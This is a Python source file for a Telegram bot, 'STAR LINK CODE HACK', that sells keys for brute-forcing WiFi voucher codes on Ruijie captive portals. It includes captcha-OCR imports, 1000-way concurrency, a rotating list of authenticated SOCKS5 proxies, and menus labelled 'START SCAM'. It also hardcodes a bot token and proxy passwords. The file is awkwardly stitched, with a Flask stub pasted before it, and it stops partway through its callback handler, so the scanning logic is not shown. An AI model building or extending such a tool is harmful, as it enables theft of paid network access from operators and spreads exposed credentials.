import os
from threading import Thread
from flask import Flask

# Render Health Check အတွက် Web Server သေးသေးလေး
app = Flask("")


@app.route("/")
def home():
    return "Bot is running!"


def run():
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)


def keep_alive():
    t = Thread(target=run)
    t.start()


# ----------------------------------------
# သင့်မူလ Telegram Bot Code များ ဒီအောက်မှာ ဆက်လက်ရှိပါမည်
# ----------------------------------------

if __name__ == "__main__":
    keep_alive()  # Web server စတင်စက်နှိုးမည်
    # bot.polling() သို့မဟုတ် သင့် bot ၏ main execution run ပေးပါ
import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid, hashlib, threading
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiohttp import web
import cv2
import ddddocr
import numpy as np
from datetime import datetime, timedelta, timezone
import sqlite3
from contextlib import contextmanager
from aiohttp_socks import ProxyConnector, ProxyType
from urllib.parse import urlparse
import concurrent.futures

#ဒီနေရာမှာchangeပေးပါbro
BOT_TOKEN = "8746267406:AAFx9s0Ya9YoMkXA4ntqqkcjTGQ0gW8q5xg"
ADMIN_ID = "8702460710"
##################

# ==================== PREMIUM EMOJI IDS ====================
E_SCAN    = '<tg-emoji emoji-id="5456140674028019486">⚡</tg-emoji>'
E_TARGET  = '<tg-emoji emoji-id="5328089410963513796">🏹</tg-emoji>'
E_CODE    = '<tg-emoji emoji-id="5332739932832146628">🎯</tg-emoji>'
E_FIRE    = '<tg-emoji emoji-id="5212932275376759608">🔥</tg-emoji>'
E_SWORD   = '<tg-emoji emoji-id="6116278319949288319">⚔️</tg-emoji>'
E_WARN    = '<tg-emoji emoji-id="5215557810359639942">⚠️</tg-emoji>'
E_PROXY   = '<tg-emoji emoji-id="5334680648164580850">🔀</tg-emoji>'
E_TICKET  = '<tg-emoji emoji-id="5418010521309815154">🎫</tg-emoji>'
E_SPARK   = '<tg-emoji emoji-id="6080071943212503588">✨</tg-emoji>'
E_USER    = '<tg-emoji emoji-id="5857159262194634073">👤</tg-emoji>'
E_ID      = '<tg-emoji emoji-id="5255835635704408236">🆔</tg-emoji>'
E_PARTY   = '<tg-emoji emoji-id="4956596167451346576">🎉</tg-emoji>'
E_CHECK   = '<tg-emoji emoji-id="6296367896398399651">✅</tg-emoji>'
E_INF     = '<tg-emoji emoji-id="6080260479391896474">♾️</tg-emoji>'
E_REFRESH = '<tg-emoji emoji-id="6179402102838661361">🔄</tg-emoji>'
E_GLOBE   = '<tg-emoji emoji-id="5224450179368767019">🌐</tg-emoji>'
E_LINK    = '<tg-emoji emoji-id="5253577054137362120">🔗</tg-emoji>'
E_INBOX   = '<tg-emoji emoji-id="5443127283898405358">📥</tg-emoji>'
E_GREEN   = '<tg-emoji emoji-id="6298751564592973547">🟢</tg-emoji>'
E_RED     = '<tg-emoji emoji-id="6269223265001017592">🔴</tg-emoji>'
E_CLIP    = '<tg-emoji emoji-id="6300559565435963297">📋</tg-emoji>'
E_CROWN   = '<tg-emoji emoji-id="5217822164362739968">👑</tg-emoji>'
E_ROCKET  = '<tg-emoji emoji-id="5188481279963715781">🚀</tg-emoji>'
E_STOPEMJ = '<tg-emoji emoji-id="6271674836628541366">🛑</tg-emoji>'
E_DICE    = '<tg-emoji emoji-id="5971796410385829300">🎲</tg-emoji>'
E_KEY     = '<tg-emoji emoji-id="4967797089971995307">🔑</tg-emoji>'
E_NOTE    = '<tg-emoji emoji-id="5197269100878907942">📝</tg-emoji>'
E_MEGA    = '<tg-emoji emoji-id="5424818078833715060">📢</tg-emoji>'
E_CROSS   = '<tg-emoji emoji-id="6244410276859350931">❌</tg-emoji>'
E_HOUR    = '<tg-emoji emoji-id="5402117686320724687">⏳</tg-emoji>'
E_SEARCH  = '<tg-emoji emoji-id="5386367538735104399">🔍</tg-emoji>'
E_PACKAGE = '<tg-emoji emoji-id="5325900626909994389">📦</tg-emoji>'
E_STATS   = '<tg-emoji emoji-id="5244837092042750681">📊</tg-emoji>'
E_CLOCK   = '<tg-emoji emoji-id="5255971360965930740">⏱</tg-emoji>'

# ==================== DOMAIN AUTO-DETECT HELPERS (NEW) ====================
def get_portal_base(session_url):
    """Portal URL ကနေ base domain ကို auto extract (portal-as / portal-mm-as / အခြား)"""
    try:
        p = urlparse(session_url)
        if p.scheme and p.netloc:
            return f"{p.scheme}://{p.netloc}"
    except Exception:
        pass
    return "https://portal-as.ruijienetworks.com"

def get_portal_host(session_url):
    """Portal URL ကနေ hostname ကို auto extract"""
    try:
        p = urlparse(session_url)
        if p.netloc:
            return p.netloc
    except Exception:
        pass
    return "portal-as.ruijienetworks.com"

# --- Local Storage Setup ---
DB_PATH = "bot_data.db"

def get_db_connection():
    conn = sqlite3.connect(DB_PATH, timeout=30, check_same_thread=False)
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA synchronous=NORMAL")
    conn.execute("PRAGMA cache_size=10000")
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db_connection()
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS keys
                 (key TEXT PRIMARY KEY,
                  user_id TEXT,
                  plan TEXT,
                  expires_at TEXT,
                  code_limit INTEGER DEFAULT 1000,
                  used_codes INTEGER DEFAULT 0)''')
    c.execute('''CREATE TABLE IF NOT EXISTS results
                 (user_id TEXT PRIMARY KEY,
                  codes TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (user_id TEXT PRIMARY KEY,
                  key TEXT,
                  registered_at TEXT,
                  telegram_name TEXT,
                  telegram_username TEXT)''')
    for column in ("telegram_name", "telegram_username"):
        try:
            c.execute(f"ALTER TABLE users ADD COLUMN {column} TEXT")
        except sqlite3.OperationalError:
            pass
    c.execute('''CREATE TABLE IF NOT EXISTS user_settings
                 (user_id TEXT PRIMARY KEY,
                  proxy_enabled INTEGER DEFAULT 1)''')
    conn.commit()
    conn.close()

init_db()

@contextmanager
def get_db_cursor():
    conn = get_db_connection()
    try:
        yield conn.cursor()
        conn.commit()
    finally:
        conn.close()

def db_get_proxy_setting(user_id):
    with get_db_cursor() as c:
        c.execute("SELECT proxy_enabled FROM user_settings WHERE user_id = ?", (user_id,))
        result = c.fetchone()
        if result:
            return bool(result[0])
    return True

def db_set_proxy_setting(user_id, enabled):
    with get_db_cursor() as c:
        c.execute("INSERT OR REPLACE INTO user_settings (user_id, proxy_enabled) VALUES (?, ?)",
                  (user_id, 1 if enabled else 0))


def db_get_key(key):
    with get_db_cursor() as c:
        c.execute("SELECT * FROM keys WHERE key = ?", (key,))
        row = c.fetchone()
        if row:
            return {
                "key": row[0], "user_id": row[1], "plan": row[2],
                "expires_at": row[3], "code_limit": row[4], "used_codes": row[5]
            }
    return None


def db_get_user(user_id):
    with get_db_cursor() as c:
        c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
        row = c.fetchone()
        if row:
            return {
                "user_id": row[0], "key": row[1], "registered_at": row[2],
                "telegram_name": row[3] or "", "telegram_username": row[4] or ""
            }
    return None


def db_add_user(user_id, key, telegram_name="", telegram_username=""):
    with get_db_cursor() as c:
        c.execute(
            "INSERT OR REPLACE INTO users (user_id, key, registered_at, telegram_name, telegram_username) VALUES (?, ?, ?, ?, ?)",
            (user_id, key, datetime.now(timezone.utc).isoformat(), telegram_name, telegram_username)
        )


def db_get_user_by_key(key):
    with get_db_cursor() as c:
        c.execute("SELECT * FROM users WHERE key = ?", (key,))
        row = c.fetchone()
        if row:
            return {
                "user_id": row[0], "key": row[1], "registered_at": row[2],
                "telegram_name": row[3] or "", "telegram_username": row[4] or ""
            }
    return None


def db_add_key(key, user_id, plan, expires_at, code_limit=1000):
    with get_db_cursor() as c:
        c.execute(
            "INSERT OR REPLACE INTO keys (key, user_id, plan, expires_at, code_limit, used_codes) VALUES (?, ?, ?, ?, ?, 0)",
            (key, user_id, plan, expires_at, code_limit)
        )


def db_delete_key(key):
    with get_db_cursor() as c:
        c.execute("DELETE FROM keys WHERE key = ?", (key,))
        c.execute("DELETE FROM users WHERE key = ?", (key,))


def db_get_all_keys():
    with get_db_cursor() as c:
        c.execute("SELECT * FROM keys")
        rows = c.fetchall()
        return {
            row[0]: {
                "user_id": row[1], "plan": row[2], "expires_at": row[3],
                "code_limit": row[4], "used_codes": row[5]
            }
            for row in rows
        }


def db_get_all_users():
    with get_db_cursor() as c:
        c.execute("SELECT user_id FROM users")
        return [row[0] for row in c.fetchall()]


def db_get_results(user_id):
    with get_db_cursor() as c:
        c.execute("SELECT codes FROM results WHERE user_id = ?", (str(user_id),))
        row = c.fetchone()
        return json.loads(row[0]) if row and row[0] else []


def db_save_results(user_id, codes):
    with get_db_cursor() as c:
        c.execute(
            "INSERT OR REPLACE INTO results (user_id, codes) VALUES (?, ?)",
            (str(user_id), json.dumps(list(codes)))
        )


def db_increment_used_codes(user_id):
    with get_db_cursor() as c:
        c.execute("SELECT key FROM users WHERE user_id = ?", (str(user_id),))
        row = c.fetchone()
        if row:
            c.execute("UPDATE keys SET used_codes = used_codes + 1 WHERE key = ?", (row[0],))


def generate_random_key(length=12):
    chars = string.ascii_uppercase + string.digits
    return "".join(random.choice(chars) for _ in range(length))


def is_admin(user_id):
    return str(user_id) == str(ADMIN_ID)

# ==================== SOCKS5 PROXY LIST ====================
PROXY_LIST = [
    "socks5://wGai8DyPSNeQlAd:8WaUgqvJvWAyqev@74.122.59.173:46755",
    "socks5://tzXeza38EipmXsG:wCBAzafvMmK8Ga1@45.45.197.176:43067",
    "socks5://5kIBW3bsPzzJ1lj:aJRPb2VJSRZAguM@205.196.9.184:45587",
    "socks5://rx5pJgxEHXd0o7x:uz24glKbgeUUImN@205.196.10.28:44219",
    "socks5://O6OAD3lumn3SgnM:Jxu2Pjh5dNCm5rt@205.196.8.80:46631",
    "socks5://IjmCt2FqgNmztJy:YsI0sZkXYck4MUX@205.196.9.107:47173",
    "socks5://PvXLEKn1kZVQJEp:jFtdLOBu9aKQHU9@205.196.8.196:46312",
    "socks5://D2AiNwOf6EFrXbB:IMgUdQgGAYDBLug@205.196.8.138:45734",
    "socks5://hnpI7ZMjgezqECv:ccOXiU2p2WrUxM1@205.196.8.171:42890",
    "socks5://O0cHRJA8rejuyEu:2nb8OXLrQ2YmZ4Y@198.143.13.145:45652",
    "socks5://8NTXIon7t1XoHvH:U6EzSoBJ1AA7K8V@74.122.56.209:44662",
    "socks5://u5dJ1AQnqvl6d0m:iI8sWqq113npBkq@205.196.9.189:48881",
    "socks5://0JNnXAruZUVbLWa:rlGpLEsoZq95kz7@205.196.11.212:48256",
    "socks5://nQ2EPjxw0aXDlw1:N2H6w5ZOxjIdcyT@205.196.8.33:47226",
    "socks5://g1EtCz12NSazZUN:ihktMqFAUIwmjLW@205.196.10.37:45610",
    "socks5://KmjSGD5Cu84yDke:2IBX5Q5iDOI7cQG@5.102.107.77:44792",
    "socks5://BajD8aFKbyV27V4:UbCDUeFAsBtDWWd@91.192.242.165:42355",
    "socks5://pfxS7n8VqHOXZz6:fwu0UcCxNwXvBlm@91.192.241.153:42838",
    "socks5://6VE1d9oTKkhJmT6:79lfYAZx86uz4b7@92.113.182.220:42886",
    "socks5://g0EoLcJRjwzdnf2:w1VBpsQTHntjBxw@200.234.172.70:48881",
]

_proxy_index = 0

def get_next_proxy():
    """
    Return: (proxy_url, proxy_auth, proxy_type)
      - proxy_url : "socks5://host:port" | "http://host:port"
      - proxy_auth: (user, pass) or None
      - proxy_type: "socks5" | "socks4" | "http"
    """
    global _proxy_index
    if not PROXY_LIST:
        return None, None, None
    
    proxy_str = PROXY_LIST[_proxy_index % len(PROXY_LIST)].strip()
    _proxy_index += 1
    
    if proxy_str.startswith("socks5://"):
        rest = proxy_str[len("socks5://"):]
        if "@" in rest:
            creds, host_port = rest.rsplit("@", 1)
            user, password = creds.split(":", 1)
            return f"socks5://{host_port}", (user, password), "socks5"
        return proxy_str, None, "socks5"
    
    elif proxy_str.startswith("socks4://"):
        rest = proxy_str[len("socks4://"):]
        if "@" in rest:
            creds, host_port = rest.rsplit("@", 1)
            user, password = creds.split(":", 1)
            return f"socks4://{host_port}", (user, password), "socks4"
        return proxy_str, None, "socks4"
    
    elif proxy_str.startswith("http://") or proxy_str.startswith("https://"):
        scheme = "https" if proxy_str.startswith("https://") else "http"
        rest = proxy_str.split("://", 1)[1]
        if "@" in rest:
            creds, host_port = rest.rsplit("@", 1)
            user, password = creds.split(":", 1)
            return f"{scheme}://{host_port}", (user, password), "http"
        return proxy_str, None, "http"
    
    else:
        if "@" in proxy_str:
            creds, host_port = proxy_str.rsplit("@", 1)
            user, password = creds.split(":", 1)
            return f"http://{host_port}", (user, password), "http"
        return f"http://{proxy_str}", None, "http"

SUCCESS_CODE = asyncio.Queue()
bot = AsyncTeleBot(BOT_TOKEN)
user_data = {}
approve = {}
scan_tasks = {}
success_messages = {}
success_texts = {}
limited_messages = {}
limited_texts = {}
captcha_state = {}
session = None
_connector = None

# ==================== CONCURRENCY (RESTORED 1000) ====================
CONCURRENCY = 1000
_voucher_sem = None
_start_time = time.monotonic()

MAX_CONCURRENT_SCANS = 100
active_scans_count = 0
active_scans_lock = asyncio.Lock()

paid_users = {}

async def handle(request):
    return web.Response(text="Bot is awake and running 24/7!")

async def web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('BOT_PORT', 8099))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()

def get_main_keyboard(user_id=None):
    keyboard = InlineKeyboardMarkup(row_width=2)
    
    if user_id:
        proxy_enabled = db_get_proxy_setting(user_id)
        proxy_text = "🔴 Proxy OFF" if not proxy_enabled else "🟢 Proxy ON"
        proxy_callback = "menu_proxy_off" if proxy_enabled else "menu_proxy_on"
    else:
        proxy_text = "🟢 Proxy ON"
        proxy_callback = "menu_proxy_off"
        
    keyboard.add(
        InlineKeyboardButton("🎫 PAID USER", callback_data="menu_paid"),
        InlineKeyboardButton("🔗 STAR LINK Portal URL ထည့်ရန်", callback_data="menu_free_trial"),
        InlineKeyboardButton(proxy_text, callback_data=proxy_callback),
        InlineKeyboardButton("📋 Success Codes ကြည့်မည်", callback_data="menu_result"),
        InlineKeyboardButton("🔄 Recheck ပြန်လုပ်စစ်မည်", callback_data="menu_recheck"),
        InlineKeyboardButton("🛑 Scan ရပ်မည်", callback_data="menu_stop")
    )
    if user_id and is_admin(user_id):
        keyboard.add(InlineKeyboardButton("👑 Admin Panel", callback_data="menu_admin_panel"))
    keyboard.add(InlineKeyboardButton("🔙 Back", callback_data="menu_back"))
    return keyboard

def get_voucher_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("🔢 VOUCHER 6 လုံး", callback_data="scan_6"),
        InlineKeyboardButton("🔢 VOUCHER 7 လုံး", callback_data="scan_7"),
        InlineKeyboardButton("🔢 VOUCHER 8 လုံး", callback_data="scan_8"),
        InlineKeyboardButton("🔢 VOUCHER 9 လုံး", callback_data="scan_9"),
        InlineKeyboardButton("🔤 VOUCHER ascii-lower", callback_data="scan_ascii-lower"),
        InlineKeyboardButton("🎲 VOUCHER all", callback_data="scan_all"),
        InlineKeyboardButton("🎲 VOUCHER all 7", callback_data="scan_all7"),
        InlineKeyboardButton("🎲 VOUCHER all 8", callback_data="scan_all8"),
        InlineKeyboardButton("🔤+🔢 MIXED 6လုံး (x3kark)", callback_data="scan_mixed"),
        InlineKeyboardButton("🔤+🔢 MIXED 8လုံး (8twcqeb)", callback_data="scan_mixed8"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back")
    )
    return keyboard

def get_digit_keyboard(mode):
    keyboard = InlineKeyboardMarkup(row_width=5)
    buttons = []
    for i in range(10):
        buttons.append(InlineKeyboardButton(str(i), callback_data=f"digit_{mode}_{i}"))
    keyboard.add(*buttons)
    keyboard.add(InlineKeyboardButton("🎲 Random ဖြစ်ရှာရန်", callback_data=f"digit_{mode}_random"))
    keyboard.add(InlineKeyboardButton("🔙 Back", callback_data="menu_back"))
    return keyboard

def get_start_scam_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton("🚀 START SCAM", callback_data="menu_start_scam"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back")
    )
    return keyboard

def get_paid_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton("✅ KEY ထည့်ရန်", callback_data="menu_enter_key"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back")
    )
    return keyboard


def get_admin_main_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("🔑 Generate Key", callback_data="admin_genkey"),
        InlineKeyboardButton("🗑️ Delete Key", callback_data="admin_delkey"),
        InlineKeyboardButton("📋 List Keys", callback_data="admin_listkeys"),
        InlineKeyboardButton("👥 Users List", callback_data="admin_users"),
        InlineKeyboardButton("📊 Bot Stats", callback_data="admin_stats"),
        InlineKeyboardButton("🔙 Back to menu", callback_data="menu_back")
    )
    return keyboard


def get_admin_genkey_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=3)
    keyboard.add(
        InlineKeyboardButton("1d", callback_data="admin_gen_1d"),
        InlineKeyboardButton("2d", callback_data="admin_gen_2d"),
        InlineKeyboardButton("3d", callback_data="admin_gen_3d"),
        InlineKeyboardButton("4d", callback_data="admin_gen_4d"),
        InlineKeyboardButton("5d", callback_data="admin_gen_5d"),
        InlineKeyboardButton("6d", callback_data="admin_gen_6d"),
        InlineKeyboardButton("7d", callback_data="admin_gen_7d"),
        InlineKeyboardButton("8d", callback_data="admin_gen_8d"),
        InlineKeyboardButton("9d", callback_data="admin_gen_9d"),
        InlineKeyboardButton("10d", callback_data="admin_gen_10d"),
        InlineKeyboardButton("11d", callback_data="admin_gen_11d"),
        InlineKeyboardButton("12d", callback_data="admin_gen_12d"),
        InlineKeyboardButton("13d", callback_data="admin_gen_13d"),
        InlineKeyboardButton("14d", callback_data="admin_gen_14d"),
        InlineKeyboardButton("15d", callback_data="admin_gen_15d"),
        InlineKeyboardButton("16d", callback_data="admin_gen_16d"),
        InlineKeyboardButton("17d", callback_data="admin_gen_17d"),
        InlineKeyboardButton("18d", callback_data="admin_gen_18d"),
        InlineKeyboardButton("19d", callback_data="admin_gen_19d"),
        InlineKeyboardButton("20d", callback_data="admin_gen_20d"),
        InlineKeyboardButton("21d", callback_data="admin_gen_21d"),
        InlineKeyboardButton("22d", callback_data="admin_gen_22d"),
        InlineKeyboardButton("23d", callback_data="admin_gen_23d"),
        InlineKeyboardButton("24d", callback_data="admin_gen_24d"),
        InlineKeyboardButton("25d", callback_data="admin_gen_25d"),
        InlineKeyboardButton("26d", callback_data="admin_gen_26d"),
        InlineKeyboardButton("27d", callback_data="admin_gen_27d"),
        InlineKeyboardButton("28d", callback_data="admin_gen_28d"),
        InlineKeyboardButton("29d", callback_data="admin_gen_29d"),
        InlineKeyboardButton("30d", callback_data="admin_gen_30d"),
        InlineKeyboardButton("1h", callback_data="admin_gen_1h"),
        InlineKeyboardButton("Unlimited", callback_data="admin_gen_unlimited"),
        InlineKeyboardButton("🔙 Back", callback_data="admin_back")
    )
    return keyboard


def get_admin_limit_keyboard(plan):
    keyboard = InlineKeyboardMarkup(row_width=2)
    for limit in (100, 500, 1000, 5000, 10000):
        keyboard.add(InlineKeyboardButton(f"🔢 {limit} Codes", callback_data=f"admin_make_{plan}_{limit}"))
    keyboard.add(InlineKeyboardButton("🔙 Back", callback_data="admin_genkey"))
    return keyboard


def get_admin_back_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(InlineKeyboardButton("🔙 Back to Admin Panel", callback_data="admin_back"))
    return keyboard

def get_back_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(InlineKeyboardButton("🔙 Back", callback_data="menu_back"))
    return keyboard

def get_scam_button_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton("🛑 STOP SCAM", callback_data="menu_stop"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back")
    )
    return keyboard

@bot.message_handler(commands=['start'])
async def start(message):
    user_id = str(message.chat.id)
    user_name = message.from_user.first_name or message.from_user.username or "User"
    
    if message.chat.id not in user_data:
        user_data[message.chat.id] = {}
    
    if is_admin(user_id):
        approve[message.chat.id] = True
        paid_users[user_id] = True
    else:
        user_info = db_get_user(user_id)
        if user_info:
            key_info = db_get_key(user_info["key"])
            if key_info and check_key_expiration(key_info["expires_at"]):
                approve[message.chat.id] = True
                paid_users[user_id] = True

    proxy_status = "ON" if db_get_proxy_setting(user_id) else "OFF"
    
    if user_id in paid_users or user_id in approve:
        approve[message.chat.id] = True
        welcome_text = (
            f"{E_SPARK} <b>STAR LINK CODE HACK</b> {E_SPARK}\n\n"
            f"{E_USER} NAME: {user_name}\n"
            f"{E_ID} USER ID: <code>{user_id}</code>\n\n"
            f"{E_PARTY} မင်္ဂလာပါခင်ဗျာ!\n"
            f"{E_CHECK} သင့်အနေနဲ့ PAID USER ဖြစ်ပါတယ်။\n"
            f"{E_INF} Unlimited Credit ဖြင့် သုံးစွဲနိုင်ပါသည်။\n"
            f"{E_REFRESH} Proxy Status: {proxy_status}\n\n"
            f"အောက်ပါ Menu မှ သင်လိုချင်တာကိုရွေးချယ်ပါ။"
        )
    else:
        welcome_text = (
            f"{E_SPARK} <b>STAR LINK CODE HACK</b> {E_SPARK}\n\n"
            f"{E_USER} NAME: {user_name}\n"
            f"{E_ID} USER ID: <code>{user_id}</code>\n\n"
            f"{E_WARN} သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n"
            f"{E_REFRESH} Proxy Status: {proxy_status}\n\n"
            f"PAID USER ဖြစ်ရန် အောက်ပါ Menu မှ PAID USER ကိုနှိပ်ပါ။\n"
            f"👨‍‍💻 Admin: @STHTK"
        )
    
    await bot.send_message(message.chat.id, welcome_text, reply_markup=get_main_keyboard(user_id), parse_mode="HTML")

@bot.message_handler(commands=['sendall'])
async def send_all_broadcast(message):
    if str(message.chat.id) != ADMIN_ID:
        return
    
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "Usage: /sendall [your_message]")
        return
    
    broadcast_text = f"{E_MEGA} <b>ADMIN NOTIFICATION</b>\n\n{args[1]}"
    user_ids = db_get_all_users()
    
    count = 0
    for uid in user_ids:
        try:
            await bot.send_message(int(uid), broadcast_text, parse_mode="HTML")
            count += 1
            await asyncio.sleep(0.1)
        except:
            continue
            
    await bot.reply_to(message, f"{E_CHECK} User {count} ယောက်ထံသို့ စာပို့ပြီးပါပြီ။", parse_mode="HTML")

@bot.message_handler(commands=['admin'])
async def admin_command(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, f"{E_CROSS} သင် Admin မဟုတ်ပါ။", parse_mode="HTML")
        return
    await bot.reply_to(
        message,
        "👑 Admin Panel\n\nလုပ်ဆောင်ချက်တစ်ခုရွေးပါ။",
        reply_markup=get_admin_main_keyboard()
    )

@bot.callback_query_handler(func=lambda call: True)
async def callback_handler(call):
    chat_id = call.message.chat.id
    user_id = str(chat_id)
    user_name = call.from_user.first_name or call.from_user.username or "User"
    telegram_username = f"@{call.from_user.username}" if call.from_user.username else "Not set"

    if is_admin(user_id):
        approve[chat_id] = True
        paid_users[user_id] = True

    if call.data == "menu_admin_panel":
        if not is_admin(chat_id):
            await bot.answer_callback_query(call.id, f"{E_CROSS} သင် Admin မဟုတ်ပါ။")
            return
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text="👑 Admin Panel\n\nလုပ်ဆောင်ချက်တစ်ခုရွေးပါ။",
            reply_markup=get_admin_main_keyboard()
        )
        await bot.answer_callback_query(call.id)
        return

    if call.data.startswith("admin_"):
        if not is_admin(chat_id):
            await bot.answer_callback_query(call.id, f"{E_CROSS} သင် Admin မဟုတ်ပါ။")
            return
        if call.data == "admin_back":
            await bot.edit_message_text(
                chat_id=chat_id, message_id=call.message.message_id,
                text="👑 Admin Panel\n\nလုပ်ဆောင်ချက်တစ်ခုရွေးပါ။",
                reply_markup=get_admin_main_keyboard()
            )
            await bot.answer_callback_query(call.id)
            return
        if call.data == "admin_genkey":
            await bot.edit_message_text(
                chat_id=chat_id, message_id=call.message.message_id,
                text=f"{E_KEY} Key သက်တမ်းရွေးပါ။",
                reply_markup=get_admin_genkey_keyboard(),
                parse_mode="HTML"
            )
            await bot.answer_callback_query(call.id)
            return
        if call.data.startswith("admin_make_"):
            parts = call.data.split("_")
            plan = parts[2]
            code_limit = int(parts[3])
            user_data.setdefault(chat_id, {})["pending_admin_key"] = {
                "plan": plan,
                "code_limit": code_limit
            }
            await bot.edit_message_text(
                chat_id=chat_id, message_id=call.message.message_id,
                text=(f"{E_KEY} Plan: {plan}\n"
                      f"🔢 Limit: {code_limit} codes\n\n"
                      f"Key သုံးမည့် Telegram User ID ကို ဒီ chat ထဲ ပို့ပါ။\n"
                      f"ဥပမာ: <code>1981253384</code>"),
                reply_markup=get_admin_back_keyboard(),
                parse_mode="HTML"
            )
            await bot.answer_callback_query(call.id)
            return
        if call.data.startswith("admin_gen_"):
            plan = call.data.replace("admin_gen_", "")
            await bot.edit_message_text(
                chat_id=chat_id, message_id=call.message.message_id,
                text=f"{E_KEY} Selected plan: {plan}\n\n🔢 Code limit ရွေးပါ။",
                reply_markup=get_admin_limit_keyboard(plan),
                parse_mode="HTML"
            )
            await bot.answer_callback_query(call.id)
            return
        if call.data == "admin_delkey":
            await bot.edit_message_text(
                chat_id=chat_id, message_id=call.message.message_id,
                text="🗑️ Key ဖျက်ရန်: /delkey [key]",
                reply_markup=get_admin_back_keyboard()
            )
            await bot.answer_callback_query(call.id)
            return
        if call.data == "admin_listkeys":
            await bot.answer_callback_query(call.id)
            await listkeys_command(call.message)
            return
        if call.data == "admin_users":
            await bot.answer_callback_query(call.id)
            await users_list_command(call.message)
            return
        if call.data == "admin_stats":
            await bot.answer_callback_query(call.id)
            await stats_command(call.message)
            return

    if call.data == "menu_back":
        proxy_enabled = db_get_proxy_setting(user_id)
        status_text = "ON" if proxy_enabled else "OFF"
        
        if user_id in paid_users or user_id in approve:
            text = (
                f"{E_SPARK} <b>STAR LINK CODE HACK</b> {E_SPARK}\n\n"
                f"{E_USER} NAME: {user_name}\n"
                f"{E_ID} USER ID: <code>{user_id}</code>\n\n"
                f"{E_CHECK} PAID USER - Unlimited Access\n"
                f"{E_REFRESH} Proxy Status: {status_text}"
            )
        else:
            text = (
                f"{E_SPARK} <b>STAR LINK CODE HACK</b> {E_SPARK}\n\n"
                f"{E_USER} NAME: {user_name}\n"
                f"{E_ID} USER ID: <code>{user_id}</code>\n\n"
                f"{E_WARN} သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n"
                f"{E_REFRESH} Proxy Status: {status_text}\n\n"
                f"PAID USER ဖြစ်ရန် အောက်ပါ Menu မှ PAID USER ကိုနှိပ်ပါ။"
            )
        
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text=text,
            reply_markup=get_main_keyboard(user_id),
            parse_mode="HTML"
        )
        await bot.answer_callback_query(call.id)
        return

    # ========== PROXY TOGGLE ==========
    if call.data == "menu_proxy_on" or call.data == "menu_proxy_off":
        if user_id not in paid_users and user_id not in approve:
            await bot.answer_callback_query(call.id, f"{E_CROSS} သင် PAID USER မဟုတ်ပါ။")
            return
        
        current = db_get_proxy_setting(user_id)
        new_status = not current
        db_set_proxy_setting(user_id, new_status)
        
        status_text = "ON" if new_status else "OFF"
        
        if user_id in paid_users or user_id in approve:
            text = (
                f"{E_SPARK} <b>STAR LINK CODE HACK</b> {E_SPARK}\n\n"
                f"{E_USER} NAME: {user_name}\n"
                f"{E_ID} USER ID: <code>{user_id}</code>\n\n"
                f"{E_CHECK} PAID USER - Unlimited Access\n"
                f"{E_REFRESH} Proxy Status: {status_text}"
            )
        else:
            text = (
                f"{E_SPARK} <b>STAR LINK CODE HACK</b> {E_SPARK}\n\n"
                f"{E_USER} NAME: {user_name}\n"
                f"{E_ID} USER ID: <code>{user_id}</code>\n\n"
                f"{E_WARN} သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n"
                f"{E_REFRESH} Proxy Status: {status_text}"
            )
        
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text=text,
            reply_markup=get_main_keyboard(user_id),
            parse_mode="HTML"
        )
        await bot.answer_callback_query(call.id, f"✅ Proxy {status_text} ဖြစ်သွားပါပြီ။")
        return
    
    if call.data == "menu_free_trial":
        if user_id not in paid_users and user_id not in approve:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text=f"{E_CROSS} သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\nPAID USER ဖြစ်ရန် Admin @STHTK သို့ ဆက်သွယ်ပါ။",
                reply_markup=get_back_keyboard(),
                parse_mode="HTML"
            )
            await bot.answer_callback_query(call.id)
            return
        
        text = (
            f"{E_LINK} <b>Portal URL ထည့်သွင်းရန်:</b>\n\n"
            f"<code>/portal [your_portal_url]</code>\n\n"
            "ဥပမာ:\n"
            "<code>/portal https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?lang=en_US&mac=02:00:00:00:00:00</code>\n\n"
            "Portal URL အသစ်ထည့်ပါက ယခင် URL ပျက်သွားမည်ဖြစ်သည်။"
        )
        
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text=text,
            reply_markup=get_back_keyboard(),
            parse_mode="HTML"
        )
        await bot.answer_callback_query(call.id)
        return
    
